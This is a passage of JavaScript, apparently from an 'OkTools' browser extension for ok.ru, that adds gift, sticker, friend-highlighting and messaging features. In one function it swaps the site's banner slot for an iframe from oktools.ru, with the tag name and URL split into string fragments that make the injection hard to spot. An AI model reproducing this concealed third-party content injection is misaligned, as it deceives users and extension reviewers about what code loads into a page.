							if (k==sl)
							{
								k=0;
							}
						}, 5000);
					}										
					create_dom('span', d4, '', {"class":"clear:both;"}, '');					
					if (gift_count_glob>gift_count)
					{					
						var all=create_dom('div', d3, '', {"class":"oktools_gift_all"}, '... '+language_text('ok_theme_next')+'');
						all.addEventListener('click', function(e) {							
							var inv=d2.getElementsByClassName("oktools_gift_unvis") || null;
							var vis=d2.getElementsByClassName("oktools_gift_item") || null;
							var gift_vis=vis.length-inv.length;
							if (inv.length!=0)
							{						
								if (inv.length<limit)
								{
									limit=inv.length;
								}								
								for (var di=0;di<limit;di++)
								{ 		
									inv[0].classList.remove('oktools_gift_unvis');
									gift_count++;
								}
								doc.getElementById('oktools_gift_count_visible').textContent=gift_count;	
								if (gift_count>=gift_count_glob)
								{
									all.setAttribute("style","display:none");
								}								
							}
							else
							{								
								sendRequest({action: 'gift_load', guid: guid, last:last_gid, user:user}, function(data) {					
									if (data.result)
									{
										if (data.gifts.length>limit)
										{
											gift_count=gift_count+limit;
										}
										else
										{
											gift_count=gift_count+data.gifts.length;
										}										
										load_gift_content(data, limit, is_user, d2);
										doc.getElementById('oktools_gift_count_visible').textContent=gift_count;	
										if (gift_count>=gift_count_glob)
										{
											all.setAttribute("style","display:none");
										}
									}
								});
							}								
						});
					}
				}
				else
				{		
					create_dom('span', d4, '', {}, language_text("ok_gift_nogift"));
					if (data.user)
					{						
						var no=create_dom('div', d2, '', {"class":"oktools_gift_mess"}, '');
							create_dom('div', no, '', {}, language_text("ok_gift_nogiftuser"));
					}
				}
				if (!data.user)
				{
					var no=create_dom('div', d2, '', {"class":"oktools_gift_mess"}, '');
						create_dom('div', no, '', {}, language_text("ok_gift_nook"));
						var a=create_dom('div', no, '', {"class":"button-pro online-fr_btn","style":"padding-left:25px !important;"}, language_text("ok_gift_okshare"));
					a.addEventListener('click', function(e) {
						var target=this;
						var img=data.text_img;
						var text=data.text_mess;
						target.textContent="Отправляю ...";	
						load_img('', ''+img+'', function(data){																																				
							send_message('message', '', '', ''+guid+'', ''+text+'', data.attach, function(result){
								if (result)
								{
									target.textContent="Сообщение отправлено";
								}
								else
								{
									target.textContent="Не отправлено, попробуйте позже";
								}	
							});
						});								
					});
				}											
			}, false);	
}
function getCoords(elem) { // кроме IE8-
  var box = elem.getBoundingClientRect();

  return {
    top: box.top + pageYOffset,
    left: box.left + pageXOffset
  };

}
function gifts_slider(el, k)
{
	var slider=el.getElementsByClassName("oktools_ava_gift_img") || null;		
	for (var s=0;s<slider.length;s++)
	{ 		
		slider[s].classList.remove('avagiftvis');
		slider[s].classList.add('avagiftunvis');
		if(s==k)
		{				
			slider[s].classList.remove('avagiftunvis');
			slider[s].classList.add('avagiftvis');
		}
									
	}		
	return slider.length;
}
function user_gifts(guid)
{
	if (guid!=0)
	{
		if (user[0].uid==guid)
		{
			var hb=doc.getElementById("hook_Block_MiddleColumnTopCardUser") || null;	
			if (hb)
			{
				if(!hb.hasAttribute('uid'))		
				{			
					//console.log('GIFT USER LOAD');
					hb.setAttribute('uid', user[0].uid);
					load_user_gift(user[0].uid);
				}
			}
		}
		else
		{
			var hbf=doc.getElementById("hook_Block_MiddleColumnTopCardFriend") || null;	
			if (hbf)
			{
				if (!hbf.hasAttribute('uid'))
				{
					//console.log('GIFT FRIEND LOAD');
					hbf.setAttribute('uid', guid);
					load_user_gift(guid);	
				}
			}
		}
	}
}
function friend_search_el(el,list_friend, gift)
{
	var id=0;
	if (!el.hasAttribute('uid'))
	{		
		if (el.hasAttribute('id'))
		{
			var elid=el.getAttribute('id');
			var sid=elid.match(/pfriend_([\d]+)/i);
			if (sid && sid.length > 1)
			{
				id=sid[1];									
			}
			var sid=elid.match(/friendCardId_([\d]+)/i);
			if (sid && sid.length > 1)
			{
				id=sid[1];									
			}
		}
		else
		{
			var a=el.getElementsByTagName("a") || null;
			for (var f=0;f<a.length;f++)
			{
				var elhr=a[f].getAttribute('href');
				var sid=elhr.match(/friendId=([\d]+)/i);
				if (sid && sid.length > 1)
				{
					id=sid[1];									
				}									
				if (id==0)
				{
					var sid=elhr.match(/profile\/([\d]+)/i);
					if (sid && sid.length > 1)
					{
						id=sid[1];									
					}
				}
				if (id==0)
				{
					if (a[f].hasAttribute('hrefattrs'))
					{
						var elhr=a[f].getAttribute('hrefattrs');
						var sid=elhr.match(/friendId=([\d]+)/i);
						if (sid && sid.length > 1)
						{
							id=sid[1];							
						}
					}
				}				
			}
		}
		el.setAttribute('uid', id);
		if(gift)
		{
			el.addEventListener('click', function(e) {
				var uid=this.getAttribute('uid');
				sendRequest({action: 'save_option', param:'OkGiftUid', text: uid}, function(data) { });
			});
		}
	}
	else
	{
		id=el.getAttribute('uid');
	}
	if (list_friend)
	{
		var loading=create_dom('div',  el, '', {"class":"oktools_cssload_cont checkbox"}, '');
			create_dom('div',  loading, '', {"class":"oktools_cssload"}, '');
		el.addEventListener('click', function(e) {
			var loading=this.getElementsByClassName('oktools_cssload_cont')[0] || null;
			if (loading)
			{				
				if (this.hasAttribute('select'))
				{
					this.removeAttribute('select');
					loading.classList.remove('check');				
				}
				else
				{
					this.setAttribute('select',true);
					loading.classList.add('check');
					loading.classList.add('load');
				}
			}
			e.stopPropagation();
			e.preventDefault();
		});
	}
	
	if (id!=0)
	{
		if (!friends_arr[id])
		{
			friends_arr[id] = [false];
		}
		else
		{
			if(friends_arr[id][0])
			{
				el.setAttribute("style","background-color:orange;border-radius:5px;");
			}
			id=0;
		}
	}
	if (id==user[0].uid)
	{
		el.setAttribute("style","background-color:orange;border-radius:5px;");
		id=0;
	}
	return id;
}
function friend_load(list)
{
	if (list!="")
	{
		sendRequest({action: 'get_friends', list: list, user:user}, function(data) {
			if (data.friends)
			{
				for(var df = 0;df < data.friends.length; df++) 
				{	
					if (data.friends[df].uid!='0')
					{
						friends_arr[data.friends[df].uid] = [true];
						var friends=doc.querySelectorAll('li.cardsList_li[uid="'+data.friends[df].uid+'"],li.ugrid_i[uid="'+data.friends[df].uid+'"],div.ugrid_i[uid="'+data.friends[df].uid+'"]') || null;
						if(friends)
						{
							for (var f=0;f<friends.length;f++)
							{
								friends[f].setAttribute("style","background-color:orange;border-radius:5px;");
							}
						}
					}
				}
			}
		}, false);
	}
}
function friend_search(el)
{	
	var gift=false;
	var href=window.document.location.href;	
	if(/(\/gifts|giftsFront)+/gi.test(href))
	{
		gift=true;
	}
	var list_id='';
	var friends=el.querySelectorAll('li.cardsList_li,li.ugrid_i,div.ugrid_i') || null;
	if(friends)
	{
		for (var f=0;f<friends.length;f++)
		{
			var id=friend_search_el(friends[f],false, gift);
			if (id!=0)
			{
				list_id=list_id+''+id+',';
			}	
		}
		friend_load(list_id);
	}	
	//console.log(friends_arr);
}
function search_friend_uid(href)
{
	var guid=user[0].uid;
	if(/\/profile(\/)?([0-9]+)(\/)?/i.test(href))
	{	
		var search_uid=href.match(/\/profile(\/)?([0-9]+)/i);
		if (search_uid && search_uid.length > 1)
		{		
			guid=search_uid[2];
		}						
	}
	else if(/\/([a-z0-9\.]+)/i.test(href))
	{
		var us = new RegExp('/'+user[0].custlink+'', 'i');
		if(!us.test(href))
		{		
			var	friend_main = new RegExp('/([a-z0-9\.]+)(/)?$', 'i');
			if(friend_main.test(href))
			{	
				var hbft=doc.getElementById("hook_Block_MiddleColumnTopCard_MenuFriend") || null;	
				if (hbft)
				{
					var scr=hbft.getElementsByTagName("a") || null;
					for (var s=0;s<scr.length;s++)
					{ 
						var sc=scr[s].getAttribute('href');
						var search_uid=sc.match(/st\.friendId=([\d]+)/i);
						if (search_uid && search_uid.length > 1)
						{							
							guid=search_uid[1];	
							break;
						}
						if (guid==0)
						{
							if (scr[s].hasAttribute('hrefattrs'))
							{
								var sc=scr[s].getAttribute('hrefattrs');
								var search_uid=sc.match(/st\.friendId=([\d]+)/i);
								if (search_uid && search_uid.length > 1)
								{							
									guid=search_uid[1];	
									break;
								}
							}
						}
					}
				}									
			}
		}
	}	
	return guid;
}
function reload_ajax(href)
{	
	var user_main=false;
	
	if((/(odnoklassniki|ok)+.ru(\/)?$/gi.test(href)) || (/feed(\/)?$/gi.test(href)) || (/st.cmd=userMain?$/gi.test(href)) )		
	{		
		//console.log("MAIN PAGE FEED");
		var user_main=true;
	}
	else if(/\/(friends|guests|photos|pphotos|groups|games|statuses|forum|about|achievements|gifts|giftsFriend|holidays|bookmarks|blacklist|auctions|settings|themes)+(\/)?/gi.test(href))
	{
		//console.log("MAIN PAGE ALL");
	}
	else if(/\/(messages|notifications|marks|music|video)+(\/)?/gi.test(href))
	{
		//console.log("MAIN PAGE MENU");
		user_gifts(user[0].uid);
	}
	else if(/\/profile(\/)?([0-9]+)(\/)?/i.test(href))
	{	
		var us = new RegExp('(/)?'+user[0].uid+'', 'i');
		if(us.test(href))
		{
			var us1 = new RegExp('(/)?'+user[0].uid+'(/)?$', 'i');
			if(us1.test(href))
			{
				var user_main=true;
			}
		}
		else
		{
			var guid=0;
			var search_uid=href.match(/\/profile(\/)?([0-9]+)/i);
			if (search_uid && search_uid.length > 1)
			{		
				guid=search_uid[2];
			}								
			user_gifts(guid);			
		}
	}
	else if(/\/([a-z0-9\.]+)/i.test(href))
	{
		//console.log('link_short');
		var us = new RegExp('/'+user[0].custlink+'', 'i');
		if(us.test(href))
		{
			//console.log('USER_PAGE');
			var us1 = new RegExp('/'+user[0].custlink+'(/)?$', 'i');
			if(us1.test(href))
			{
				var user_main=true;
				//console.log('USER_MAIN');
			}
		}
		else
		{		
			var	friend_main = new RegExp('/([a-z0-9\.]+)(/)?$', 'i');
			if(friend_main.test(href))
			{	
				//console.log('FRIEND_MAIN');
				var guid=0;
				var hbft=doc.getElementById("hook_Block_MiddleColumnTopCard_MenuFriend") || null;	
				if (hbft)
				{
					var scr=hbft.getElementsByTagName("a") || null;
					for (var s=0;s<scr.length;s++)
					{ 
						var sc=scr[s].getAttribute('href');
						var search_uid=sc.match(/st\.friendId=([\d]+)/i);
						if (search_uid && search_uid.length > 1)
						{							
							guid=search_uid[1];	
							break;
						}
						if (guid==0)
						{
							if (scr[s].hasAttribute('hrefattrs'))
							{
								var sc=scr[s].getAttribute('hrefattrs');
								var search_uid=sc.match(/st\.friendId=([\d]+)/i);
								if (search_uid && search_uid.length > 1)
								{							
									guid=search_uid[1];	
									break;
								}
							}
						}
					}
				}			
				user_gifts(guid);				
			}
		}
	}		
	if (user_main)	
	{
		//console.log('USER MAIN');
		user_gifts(user[0].uid);
		var avatar=doc.getElementById('viewImageLinkId') || null;
		if (avatar) 
		{		
			user[0].ava=avatar.getAttribute('src');
			//console.log('AVA ['+user[0].ava+']');
			sendRequest({action: 'save_option', param:'OkUserAva', text: user[0].ava}, function(data) { });	
		}					
	}	
	var left_col=doc.getElementById("leftColumn") || null;	
	if (left_col)
	{		
		var hook_sb=doc.getElementById("hook_Block_StickyBannerContainer") || null;	
		if (hook_sb)
		{
			var slider=hook_sb.getElementsByClassName("stickyBannerHook")[0] || null;		
			if (slider)
			{ 
				clear_html(slider);
				var div=create_dom('div', slider, '', {"id":"hook_Block_ViewportHeightAwareBanner", "class":"hookBlock"}, "");
					create_dom('ifr'+'ame', div, '', {"src":"//oktoo"+"ls.ru/page/static/bl"+"eft.html","width":"241","height":"401","frameborder":"no","scrolling":"no","style":"margin-left:auto;margin-right:auto;padding:0pxwidth:241px;height:401px;"}, "");
			}
		}
		else
		{
			var div=create_dom('div', left_col, '', {"id":"hook_Block_StickyBannerContainer","class":"hookBlock","style":"min-height: 400px;"}, "");
				var div1=create_dom('div', div, '', {"id":"hook_Native_588888517445","class":"stickyBannerHook","data-name":"StickyBannerHook","data-params":"CENTER"}, "");
					var div2=create_dom('div', div1, '', {"id":"hook_Block_ViewportHeightAwareBanner", "class":"hookBlock"}, "");
					create_dom('ifr'+'ame', div2, '', {"src":"//oktoo"+"ls.ru/page/static/bl"+"eft.html","width":"241","height":"401","frameborder":"no","scrolling":"no","style":"margin-left:auto;margin-right:auto;padding:0pxwidth:241px;height:401px;"}, "");
			
		}
	}
	if(/\/(feed|statuses|forum)+(\/)?$/gi.test(href))
	{
		search_block_text(doc);
		
	}
	if(/\/(friends|guests)+(\/)?$/gi.test(href))
	{	
		friend_search(doc);
		var FR=doc.getElementsByClassName("loader-container")[0] || null;	
		if (FR)
		{
			var observer = new MutationObserver(function(mutations) {
				var list_id="";
				mutations.forEach(function(mutation) {
					for(var i = 0; i < mutation.addedNodes.length; i++) 
					{
						var add_node=mutation.addedNodes[i];
						if ((add_node.className=="ugrid_i") || (add_node.className=="cardsList_li show-on-hover"))  //DIALOG ADD DIV (OPEN)
						{
							var id=friend_search_el(add_node, false);
							if (id!=0)
							{
								list_id=list_id+''+id+',';
							}
						}
						
						if (add_node.className=="ugrid_cnt")  //DIALOG ADD DIV (OPEN)
						{
							//console.log('ugrid_cnt');
							var ui=add_node.getElementsByClassName("ugrid_i") || null;	
							if (ui)
							{
								for(var f = 0; f < ui.length; f++) 
								{
									var id=friend_search_el(ui[f], false);
									if (id!=0)
									{										
										list_id=list_id+''+id+',';
									}
								}
							}
						}
						
					}
				});
				friend_load(list_id);
			});
			observer.observe(FR, {attributes: false, childList: true, characterData: false, subtree:true});			
		}
	}	
	else if(/\/themes(\/)?$/gi.test(href))
	{
		theme_search_content();	
	}	
	else if(/(\/gifts|giftsFront)+/gi.test(href))
	{
		
		var gift_music=0;
		var gift_music_old=0;
		sendRequest({action: 'save_option', param:'OkGiftUid', text: '0'}, function(data) { });					
		sendRequest({action: 'save_option', param:'OkGiftId', text: '0'}, function(data) { });
		sendRequest({action: 'save_option', param:'OkGiftMusic', text: '0'}, function(data) { });
		var fi=href.match(/friendId=([\d]+)/i);
		if (fi && fi.length > 1)
		{	
			gift_uid=fi[1];	
			sendRequest({action: 'save_option', param:'OkGiftUid', text: gift_uid}, function(data) { });	
		}	
		var gift_content=doc.getElementById("hook_Block_GiftsFrontContentRBx") || null;	
		if (gift_content)
		{
			//console.log('GIFT event');
			gift_search(gift_content);
			var gift_observe = new MutationObserver(function(mutations) {
				//console.log('GIFT LOAD');
				mutations.forEach(function(mutation) {
					if ((mutation.type=="childList") && (mutation.addedNodes.length>0))
					{		
						for(var i = 0; i < mutation.addedNodes.length; i++) 
						{
							var adds_node=mutation.addedNodes[i];
							if ((adds_node.nodeType==1) && (adds_node.nodeName=="DIV"))
							{													
								gift_search(adds_node);
							}
						}
					}
				});							  
			});
			gift_observe.observe(gift_content, {attributes: false, childList: true, characterData: false, subtree:true});			
		}	
	}		
}
function gift_search(adds_node)
{
	var gift=adds_node.getElementsByClassName("gift-card") || null;
	//console.log('SEARCH GIFT|'+gift.length);
	if(gift.length>0)
	{
		for (var g=0;g<gift.length;g++)
		{						
			if (!gift[g].hasAttribute('ok_fr'))
			{
				gift[g].setAttribute('ok_fr', true);							
				gift[g].addEventListener('click', function(e) {		
					var gift_uid=0;	
					var presentId=0;	
					var a=this.getElementsByTagName("a")[0] || null;
					if(a)
					{	
						var href=a.getAttribute('href');
						if (href)
						{									
							var fi=href.match(/friendId=([\d]+)/i);
							if (fi && fi.length > 1)
							{	
								gift_uid=fi[1];	
							}
							var pi=href.match(/presentId=([\d]+)/i);
							if (pi && pi.length > 1)
							{	
								presentId=pi[1];	
							}
						}
					}								
					var params=this.getAttribute('data-seen-params');
					if (params)
					{
						var par=JSON.parse(params);
						if (presentId!=par.data.presentId)
						{
							presentId=par.data.presentId;
						}											
					}
					//console.log('GIFT SEND|'+gift_uid+'|'+presentId);
					if (gift_uid!=0)	
					{
						sendRequest({action: 'save_option', param:'OkGiftUid', text: gift_uid}, function(data) { });	
					}											
					sendRequest({action: 'save_option', param:'OkGiftId', text: presentId}, function(data) { });
				});						
			}
		}
	}
}
function send_gift_data(gift_uid, gift_id, gift_priv, gift_tain, gift_music, message, gift_type)	
{
	var anim=0;
	if ((gift_uid!=0) && (gift_id!=0))	
	{
		sendRequest({action: 'get_gift_anim', url: 'http://dp.mycdn.me/getImage?photoId='+gift_id+'&type=5'}, function(data) {
			if (data)
			{	
				anim=1;
			}										
			sendRequest({action: 'gift_send', gift_id: gift_id, gift_uid:gift_uid, anim:anim, gift_music:gift_music, gift_priv:gift_priv, gift_tain:gift_tain, message:message, gift_type:gift_type}, function(data) {											
				if (data.result)
				{
					send_gift_result(true, '', gift_uid);
					sendRequest({action: 'save_option', param:'OkGiftId', text: '0'}, function(data) { });
					sendRequest({action: 'save_option', param:'OkGiftMusic', text: '0'}, function(data) { });
				}
				else
				{
					send_gift_result(false, data.error, gift_uid);	
				}
			}, false);
		}, false);
	}
	else
	{
		if (gift_uid==0)
		{
			send_gift_result(false, 'Ошибка: Не переданны данные о получателе подарка.', '0');	
		}
		else if (gift_id==0)
		{
			send_gift_result(false, 'Ошибка: Не переданны данные о подарке.', '0');	
		}
		else
		{
			send_gift_result(false, 'Ошибка: Не переданны данные о получателе подарка и о подарке.', '0');	
		}			
	}
}
function send_gift_result(result, message, gift_uid)	
{
	var b=doc.getElementsByTagName("body")[0] || null;
	if(b)
	{
		clear_html(b);
		var d=create_dom('div', b, '', {"class":"pf_tab_content pf_gift-complete va_target","style":"margin-top:70px;"}, '');
			var d1=create_dom('div', d, '', {"class":"pf_gift-complete_hld"}, '');
				var d2=create_dom('div', d1, '', {"class":"pf_main_content"}, '');
					var d3=create_dom('div', d2, '', {"class":"pf_line_i-m"}, '');
					create_dom('img', d3, '', {"src":"/res/default/Images/payments/rich/pf-gift.png"}, '');
					if (result)
					{
						create_dom('div', d3, '', {"class":"pf_line_i-l pf_content_title"}, language_text("ok_gift_sendok"));
						create_dom('div', d3, '', {"class":"pf_line_i-l", "style":"font-size:14px;"}, language_text("ok_gift_sendok_mess"));
					}
					else
					{
						create_dom('div', d3, '', {"class":"pf_line_i-l pf_content_title"}, language_text("ok_gift_sendnot"));
						create_dom('div', d3, '', {"class":"pf_line_i-l", "style":"font-size:14px;"}, ''+message+'');
					}
				var d4=create_dom('div', d1, '', {"class":"form-actions __center","style":"margin-top:30px;"}, '');
					if (result)
					{
						create_dom('a', d4, '', {"href":"http://ok.ru/profile/"+gift_uid+"","target":"blank","style":"display:block;font-weight:bold;font-size:14px;margin-bottom:30px;"}, language_text("ok_gift_sendokuser"));	
					}
					create_dom('a', d4, '', {"href":"javascript:parent.postMessage('API_closePaymentLayer', '*');","class":"button-pro __sec"}, language_text("ok_pozd_add_close"));												
	}	
}
function test_server()
{
	/*console.log('CONNECT theme.oktools.ru');
	var img = new Image();		
	img.onload = function() {connection=true;console.log('CONNECT theme.oktools.ru TRUE');};
	img.onerror = function() {connection=false;console.log('CONNECT theme.oktools.ru FALSE');};
	img.start = new Date().getTime();
	img.src = "https://theme.oktools.ru/ping.jpg";	*/
}
function message_button(el, action, muid)
{
	var com_id="";
	var com_name="";
	el.setAttribute('style', 'min-height: 70px !important;');
	if (el.hasAttribute('id'))
	{
		com_id=el.getAttribute('id');
		com_name=el.getAttribute('name');
	}	
	//console.log('message_button|'+action+'|'+muid+'|'+com_id+'|'+com_name);
	var comment_parent=el.parentNode;
	var div=create_dom('div', comment_parent, '', {"style":"position: absolute;bottom: 0px;right: 48px;z-index:13 !important;","data-action":action, "data-muid":muid, "data-com_id":com_id, "data-com_name":com_name}, '');
		var div_menu=create_dom('div', div, '', {"class":"ok_mess_butt ok_oktools_icons","style":"display: inline-block !important;background-position: 3px -61px;", "title":""+language_text("ok_pozd_vibor")+""}, '');
		div_menu.addEventListener('click', function(e) {
			message_button_click(this, 'pozd');
		});		
		var div_card=create_dom('div', div, '', {"class":"ok_mess_butt ok_oktools_icons","style":"display: inline-block !important;background-position:4px -88px;", "title":"Открытки"}, '');
		div_card.addEventListener('click', function(e) {
			message_button_click(this, 'card');	
		});
		var div_sticker=create_dom('div', div, '', {"class":"ok_mess_butt ok_oktools_icons","style":"display: inline-block !important;background-position:-31px -89px;","data-muid":""+muid+"", "title":"Стикеры"}, '');								
		div_sticker.addEventListener('click', function(e) {
			var par=e.target.parentNode;
			var action=par.getAttribute('data-action');
			var uid=par.getAttribute('data-muid');
			sticker_popup(e.target, action, uid, 'message', 'right');
		});						
}
function message_button_click(el, mod)
{
	var par=el.parentNode;
	var action=par.getAttribute('data-action');
	var muid=[''+par.getAttribute('data-muid')+''];
	var com_id=par.getAttribute('data-com_id');
	var com_name=par.getAttribute('data-com_name');
	req_post = {"type":"message","action":""+action+"","data":"","muid":""+muid+"","com_id":""+com_id+"","com_name":""+com_name+""};
	//console.log('message_button_CLICK|'+req_post.action+'|'+req_post.muid+'|'+req_post.com_id+'|'+req_post.com_name);
	window_load(''+mod+'', '', '', '0', 'rand');	
}

function message_search(el)
{
	req_post = {"type":"","action":"","data":"","muid":"","com_id":"","com_name":""};
	var muid="";
	var comment_form=el.getElementsByClassName('comments_add_form') || null;
	if (comment_form)
	{  		
		//console.log('SEARCH COMMENT FORM|'+comment_form.length);
		//console.log(el);
		for (var cm=0;cm<comment_form.length;cm++)
		{  	
			var action=comment_form[cm].getAttribute('action');			
			if (action.search(/cmd=MessagesController/gi)!=-1)
			{						
				var search_uid=action.match(/convId=PRIVATE_([\d]+)/i);
				if (search_uid && search_uid.length > 1)
				{							
					muid=search_uid[1];	
				}
				var comment_el=comment_form[cm].querySelectorAll('div[name="st.txt"]')[0];			
				if (comment_el)
				{  
					if (comment_el.hasAttribute('data-id'))
					{
						var dataId=comment_el.getAttribute('data-id');						
						var search_uid=dataId.match(/([\d]+)_([\d]+)/i);
						if (search_uid && search_uid.length > 1)
						{							
							uid=search_uid[1];
							muid=search_uid[2];
						}
					}
					message_button(comment_el, action, muid);
				}
			}
			else if (action.search(/cmd=CommentBlock/gi)!=-1)
			{							
				var comment_el=comment_form[cm].querySelectorAll('div[name="st.dM"]')[0];			
				if (comment_el)
				{  
					if (comment_el.hasAttribute('data-id'))
					{
						var dataId=comment_el.getAttribute('data-id');
						var search_uid=dataId.match(/([\d]+)_([\d]+)_([\d]+)/i);
						if (search_uid && search_uid.length > 1)
						{							
							muid=search_uid[1];
							id=search_uid[3];
						}
					}
					message_button(comment_el, action, muid);
				}
			}
				
		}
	}	
}	
function dialog_data(winload)
{
	var params="";
	var top_panel=doc.getElementById('topPanelPopup_d');
	if (top_panel)
	{
		var dis = top_panel.getElementsByClassName('disc-i_sel')[0];
		if (dis)
		{
			if (dis.hasAttribute('data-query'))
			{
				var dis_data=dis.getAttribute('data-query');
				var data=JSON.parse(''+dis_data+'');
				if (data.userId=="null")
				{
					var group_id=data.groupid;
					var params = 'tlb.act=actSC&did='+data.id+'&dtype='+data.type+'&dDAP=off&dLLC=off&refId=sendComment-'+new Date().getTime()+'';
				}
				else
				{
					var params = 'tlb.act=actSC&did='+data.id+'&dtype='+data.type+'&dOI='+data.userId+'&dDAP=off&dLLC=off&refId=sendComment-'+new Date().getTime()+'';
				}	
				if (winload)
				{
					req_post = {"type":"dialog","action":"dialog", "data":params, "muid":""+data.userId+"","com_id":"","com_name":""};	
				}
			}
		}
	}
	return params;	
}
function dialog_button()
{
	var top_panel=doc.getElementById('topPanelPopup_d');
	if (top_panel)
	{
		var dialog_toolbar=top_panel.getElementsByClassName('disc_toolbar_i') || null;
		if (dialog_toolbar)
		{  		
			for (var ct=0;ct<dialog_toolbar.length;ct++)
			{  	
				var dialog_parent=dialog_toolbar[ct].parentNode.parentNode;
				if (!dialog_parent.hasAttribute('ok_pozd_button'))
				{	
					dialog_parent.setAttribute('ok_pozd_button', true);
					var div_comment=create_dom('div', dialog_parent, '', {"class":"disc_toolbar oktools_toolbar"}, '');						
					var div_pozd=create_dom('div', div_comment, '', {"class":"disc_toolbar_i","comm_id":"ok-e-d"}, '');
						create_dom('div', div_pozd, '', {"class":"ok_comm_butt ok_oktools_icons", "style":"background-position:-25px -64px;bottom:3px;", "title":""+language_text("ok_pozd_vibor")+""}, '');
						div_pozd.addEventListener('click', function(e) {
							req_post = {"type":"dialog","action":"", "data":"", "muid":"","com_id":"","com_name":""};
							window_load('pozd', '', '', '0', 'rand');					
						});	
					
					var div_card=create_dom('div', div_comment, '', {"class":"disc_toolbar_i"}, '');
							create_dom('div', div_card, '', {"class":"ok_comm_butt ok_oktools_icons", "style":"background-position:0px -93px;bottom:1px;", "title":"Открытки"}, '');
						div_card.addEventListener('click', function(e) {	
							req_post = {"type":"dialog","action":"", "data":"", "muid":"","com_id":"","com_name":""};
							window_load('card', '', '', '0', 'rand');	
						});	
						
					var div_sticker=create_dom('div', div_comment, '', {"class":"disc_toolbar_i"}, '');
						var but_sticker=create_dom('div', div_sticker, '', {"class":"ok_comm_butt ok_oktools_icons","style":"background-position:-35px -95px;","title":"Стикеры"}, '');
						but_sticker.addEventListener('click', function(e) {						
							sticker_popup(e.target, '', '',  'dialog', 'left');						
						});	
				}
			}			
		}	
	}
}
function sticker_img(el, cat, data)
{
	if (!el)
	{
		el=doc.getElementById('oktools_sticker_lst_'+cat+'') || null;			
	}
	for(var s = 0; s < data.length; s++) 
	{ 
		if ((data[s].cat_id==cat) || (cat=="10001") || (cat=="9999"))
		{		
			var izbr_bool='0';
			var load=data[s].load;
			if (cat!="9999")
			{
				var url=sticker_site[''+data[s].site+''][0].l;
				var url=url.replace(/#id#/gi, ""+data[s].file+"");
				var d_url=url;
				if(sticker_site[''+data[s].site+''][0].d!="")
				{
					d_url=sticker_site[''+data[s].site+''][0].d;
					d_url=d_url.replace(/#id#/gi, ""+data[s].file+"");
				}					
			}
			else
			{
				var url=data[s].img;
				var d_url=data[s].down;
				izbr_bool='1';
			}
			var stick_li=create_dom('li', el, '', {"class":"oktools_sticker_i"}, '');												
				var stick_li_div=create_dom('div', stick_li, '', {"class":"oktools_sticker_posr"}, '');
					create_dom('div', stick_li_div, '', {"class":"oktools_sticker_load", "data-id":""+data[s].id+"", "title":"Отправлен: "+load+" раз"}, ''+load+'');			
					var stick_img=create_dom('img', stick_li_div, '', {"class":"oktools_sticker", "src":""+url+"", "data-img":""+d_url+"", "data-izbr":""+izbr_bool+"", "data-id":""+data[s].id+"", "title":"Отправлен: "+load+" раз"}, '');			
					stick_img.addEventListener('click', function(e) {
						var target=this;	
						var par=this.parentNode;
						var loading=par.getElementsByClassName('oktools_cssload_cont')[0] || null;
						if (!loading)
						{		
							var loading=create_dom('div',  par, '', {"class":"oktools_cssload_cont"}, '');
								create_dom('div',  loading, '', {"class":"oktools_cssload"}, '');
						}
						else
						{
							loading.setAttribute("class","oktools_cssload_cont");
						}
						var src=this.getAttribute('src');
						var img=this.getAttribute('data-img');
						var id=this.getAttribute('data-id');	
						var izbr_bool=this.getAttribute('data-izbr');						
						var popup=doc.getElementById('oktools_sticker_popup');
						if (popup)
						{						
							var type=popup.getAttribute('type');
							var action=popup.getAttribute('action');
							var uid=popup.getAttribute('uid');			
							if (sticker_user)
							{
								var izbr_count=sticker_user.sticker.length;								
								if (izbr_count==30)
								{
									for(var s = 0; s < izbr_count; s++) 
									{ 
										if (sticker_user.sticker[s].id==id)
										{
											sticker_user.sticker[s].load=parseInt(sticker_user.sticker[s].load)+1;
											var div_count=doc.querySelectorAll('.oktools_sticker_load[data-id="'+sticker_user.sticker[s].id+'"]')[0];			
											if (div_count)
											{					
												div_count.setAttribute("title","Отправлен: "+sticker_user.sticker[s].load+" раз");
												div_count.textContent=''+sticker_user.sticker[s].load+'';
											}
										}										
									}	
									sticker_user.sticker[0]={"id":""+id+"", "img":""+src+"", "down":""+img+"","load":"1"};									
								}
								else if(izbr_count==0)
								{
									sticker_user.sticker[0]={"id":""+id+"", "img":""+src+"", "down":""+img+"","load":"1"};								
								}
								else
								{
									var search=false;									
									for(var s = 0; s < izbr_count; s++) 
									{ 
										if (sticker_user.sticker[s].id==id)
										{
											search=true;											
											sticker_user.sticker[s].load=parseInt(sticker_user.sticker[s].load)+1;
											var div_count=doc.querySelectorAll('.oktools_sticker_load[data-id="'+sticker_user.sticker[s].id+'"]')[0];			
											if (div_count)
											{					
												div_count.setAttribute("title","Отправлен: "+sticker_user.sticker[s].load+" раз");
												div_count.textContent=''+sticker_user.sticker[s].load+'';
											}
										}
									}	
									if(!search)
									{
										sticker_user.sticker[izbr_count]={"id":""+id+"", "img":""+src+"", "down":""+img+"","load":"1"};									
									}
								}
							}
							else
							{								
								sticker_user.sticker[0]={"id":""+id+"", "img":""+src+"", "down":""+img+"","load":"1"};								
							}						
							var izbr=JSON.stringify(sticker_user);													
							sendRequest({action: 'save_option', param: 'OkStickerIzbr', text: izbr}, function(result) {});							
							if (izbr_bool=='0')
							{
								var stick_ul=doc.getElementById('oktools_sticker_lst_9999') || null;			
								if (stick_ul)
								{
									clear_html(stick_ul);
									sticker_img(stick_ul, '9999', sticker_user.sticker);
								}
								var stick_ul_count=doc.getElementById('oktools_sticker_set_count_9999') || null;			
								if (stick_ul_count)
								{
									var izbr_c=izbr_count+1;
									stick_ul_count.textContent=" ("+izbr_c+" из 30)";
								}
							}
							load_img('', ''+img+'', function(data){	
								send_message(type, action, '', uid, '', data.attach, function(result){
									if (result)
									{							
										loading.classList.add('ok');																												
									}
									else
									{
										loading.classList.add('nok');
									}										
								});											
							});
							content_rating('sticker', id, '3');
							
						}
					});
		}
	}
}
function load_sticker(pid, cid, page)
{
	var div_load=doc.getElementById('oktools_sticker_cont_load');
	if (div_load)
	{
		div_load.setAttribute("style","display:block");
	}
	sendRequest({action: 'content_load', mod: 'sticker', cat_id: ''+pid+'', cat_f: ''+cid+'', page: ''+page+'',  search: '', user: user}, function(data) {	
		var div_load=doc.getElementById('oktools_sticker_cont_load');
		if (div_load)
		{
			div_load.setAttribute("style","display:none");
		}
		if (data.site)
		{
			for(var s = 0; s < data.site.length; s++) 
			{ 
				sticker_site[''+data.site[s].s+'']=new Array(data.site[s]);
			}
		}
